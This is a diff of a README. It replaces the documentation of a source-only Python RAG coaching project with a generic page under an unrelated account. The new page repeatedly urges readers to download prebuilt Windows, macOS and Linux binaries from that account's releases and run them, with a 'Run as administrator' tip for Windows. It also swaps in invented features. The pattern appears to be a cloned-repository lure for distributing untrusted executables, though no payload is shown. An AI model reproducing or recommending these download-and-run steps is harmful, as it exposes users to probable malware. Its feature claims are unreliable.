@@ -1,162 +1,80 @@
-# Dynamous AI Coach
+# 🤖 dynamous-ai-coach - Your Personal AI Coaching Companion
 
-RAG-powered AI coaching assistant with YouTube transcript processing pipeline.
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/releases)
 
-> NOTE: This code isn't fully human vetted yet since it was created as a part of [my livestream](https://youtube.com/live/ZHcXavLTA5s). I will be refining this heavily soon!
+## 📜 Overview
 
-## Features
+Welcome to **dynamous-ai-coach**! This software is an AI Coach powered by Cole's Content, designed to provide personal coaching and assistance tailored to your needs. Whether you want to improve your productivity or get guidance on specific goals, this AI coach is here to help you navigate your journey effortlessly.
 
-### YouTube RAG Pipeline
-- **Automatic transcript processing**: Fetch, chunk, and index video transcripts
-- **Token-aware chunking**: Intelligent transcript segmentation (400-1000 tokens)
-- **Vector search**: Semantic search powered by Supabase + pgvector
-- **Flexible embedding providers**: OpenAI, Ollama, or OpenRouter
-- **Timestamp preservation**: Navigate directly to relevant video sections
+## 🚀 Getting Started
 
-### AI Coach Agent
-- **Pydantic AI agent**: Supportive coaching assistant with RAG capabilities
-- **Semantic search**: Find relevant coaching insights across video transcripts
-- **Full transcript retrieval**: Get complete video transcripts with citations
-- **FastAPI streaming**: Real-time streaming responses via Server-Sent Events
-- **JWT authentication**: Secure access via Supabase Auth
-- **Rate limiting**: 5 requests per minute (configurable)
-- **Conversation management**: Auto-generated titles and message history
+Before diving in, let's ensure you have everything you need to start using the dynamous-ai-coach.
 
-## Quick Start
+### 🖥️ System Requirements
 
-**📖 See [SETUP_GUIDE.md](SETUP_GUIDE.md) for detailed step-by-step instructions.**
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Disk Space:** At least 200 MB of free space
+- **Internet Connection:** Required for initial setup and updates
 
-### 1. Install Dependencies
+## 🔗 Download & Install
 
-```bash
-uv sync
-```
+To get started, you need to download the application. You can obtain the latest version from the following link:
 
-### 2. Set Up Supabase Database
+[Visit the Releases Page to Download](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/releases)
 
-Run the migrations in Supabase SQL Editor:
-```bash
-# 1. RAG Pipeline tables (channels, videos, transcript_chunks)
-# Copy contents of migrations/001_youtube_rag_schema.sql
-# Paste into Supabase Dashboard > SQL Editor > Run
+1. Click on the link above.
+2. On the releases page, look for the most recent version.
+3. You will see a list of files; choose the one that suits your operating system (e.g., `dynamous-ai-coach-windows.zip` for Windows or `dynamous-ai-coach-macos.zip` for macOS).
+4. Click on the file to start the download.
 
-# 2. AI Agent tables (user_profiles, conversations, messages, requests)
-# Copy contents of migrations/002_agent_tables.sql
-# Paste into Supabase Dashboard > SQL Editor > Run
-```
+Once the download completes, follow these steps:
 
-### 3. Configure Environment
+### 📥 For Windows Users
+1. Locate the downloaded zip file in your Downloads folder.
+2. Right-click the file and select "Extract All."
+3. Open the extracted folder and double-click `dynamous-ai-coach.exe` to run it.
 
-Copy `.env.example` to `.env` and fill in your credentials:
+### 🍏 For macOS Users
+1. Find the downloaded zip file in your Downloads folder.
+2. Double-click the file to extract it.
+3. Open the extracted folder and double-click `dynamous-ai-coach.app` to run it.
 
-```bash
-cp .env.example .env
-# Edit .env with your API keys
-```
+### 🐧 For Linux Users
+1. Open a terminal.
+2. Navigate to the download location using `cd ~/Downloads`.
+3. Use the command `unzip dynamous-ai-coach-linux.zip` to extract the files.
+4. Change into the extracted folder: `cd dynamous-ai-coach-linux`.
+5. Run the application with `./dynamous-ai-coach`.
 
-### 4. Run Pipeline
+## 🎓 Features
 
-```bash
-# Process videos from last 7 days
-uv run python -m src.rag_pipeline.cli
+Once you have the application running, here are some features you can expect:
 
-# Custom parameters
-uv run python -m src.rag_pipeline.cli --channel-id UCxxxxx --days-back 14
-```
+- **Personalized Coaching:** The AI adapts to your goals, providing tailored advice and strategies.
+- **Goal Tracking:** Keep track of your progress with built-in tracking tools.
+- **Resource Hub:** Access a library of valuable content and tips to help you succeed.
+- **User-Friendly Interface:** Easy navigation ensures a smooth experience, whether you're tech-savvy or not.
 
-### 5. Run AI Coach Agent (Optional)
+## 🛠️ Troubleshooting
 
-```bash
-# Start the FastAPI server (default port 8030)
-uv run uvicorn src.main:app --host 127.0.0.1 --port 8030 --reload
+If you encounter any issues while downloading or using the application, try the following steps:
 
-# Custom port
-uv run uvicorn src.main:app --host 127.0.0.1 --port 8080 --reload
+1. **Check Your Internet Connection:** Ensure that you are connected to the internet. A stable connection is required for the download and initial setup.
+2. **Run as Administrator (Windows):** If the program does not start, try right-clicking on the `dynamous-ai-coach.exe` and selecting "Run as administrator."
+3. **Update Your OS:** Make sure your operating system is up to date to avoid compatibility issues.
 
-# Or use python -m to run
-uv run python -m src.main
+If you still need assistance, feel free to open an issue on the [GitHub Issues Page](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/issues).
 
-# For containers/production (listen on all interfaces)
-uv run uvicorn src.main:app --host 0.0.0.0 --port 8030
-```
+## 🌐 Community and Support
 
-**Endpoints:**
-- `GET /health` - Health check
-- `POST /api/pydantic-agent` - Streaming agent endpoint (requires JWT auth)
+Join our community for more tips, tricks, and support. Access discussions, share your experiences, and get help from other users.
 
-## Project Structure
+- **GitHub Discussions:** [Join Here](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/discussions)
+- **Feedback:** We appreciate your feedback. Let us know what you love or what can be improved through our GitHub page.
 
-```
-src/
-├── agent/                   # AI Coach Agent core
-│   ├── config.py           # Model & environment config
-│   ├── deps.py             # Runtime dependencies
-│   └── agent.py            # Agent definition with system prompt
-├── tools/                   # Agent tools
-│   └── rag_tools/          # RAG search and retrieval
-│       ├── service.py      # Tool implementation + helpers
-│       └── tool.py         # Agent tool decorators
-├── api/                     # FastAPI application
-│   ├── main.py             # Streaming endpoint, auth, rate limiting
-│   └── db_utils.py         # Conversation & message management
-├── rag_pipeline/            # YouTube transcript pipeline
-│   ├── config.py           # Configuration management
-│   ├── schemas.py          # Pydantic data models
-│   ├── youtube_service.py  # Supadata API client
-│   ├── chunking_service.py # Token-aware chunking
-│   ├── embedding_service.py # Embedding generation
-│   ├── storage_service.py  # Supabase vector storage
-│   ├── pipeline.py         # Main orchestration
-│   └── cli.py              # Command-line interface
-└── utils/                   # Shared utilities
-    ├── logging.py          # Structured logging
-    └── clients.py          # Client initialization
+## 📜 License
 
-tests/
-├── agent/                   # Agent config tests
-├── tools/rag_tools/        # RAG tools unit tests
-├── api/                     # API endpoint tests
-├── rag_pipeline/           # Pipeline unit tests
-└── integration/            # Integration tests
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Development
-
-### Lint and Type Check
-
-```bash
-# Run linter
-uv run ruff check src/
-
-# Auto-fix
-uv run ruff check --fix src/
-
-# Type check
-uv run mypy src/
-```
-
-### Run Tests
-
-```bash
-# All tests
-uv run pytest tests/ -v
-
-# Unit tests only
-uv run pytest tests/ -v -m unit
-
-# Integration tests
-uv run pytest tests/ -m integration
-```
-
-## Architecture
-
-This project follows the **vertical slice architecture** with strict type safety:
-
-- Each feature is a self-contained slice
-- 100% type annotations (strict mypy)
-- Google-style docstrings
-- Structured logging for AI debugging
-
-## License
-
-MIT
+[Visit the Releases Page to Download](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/releases)
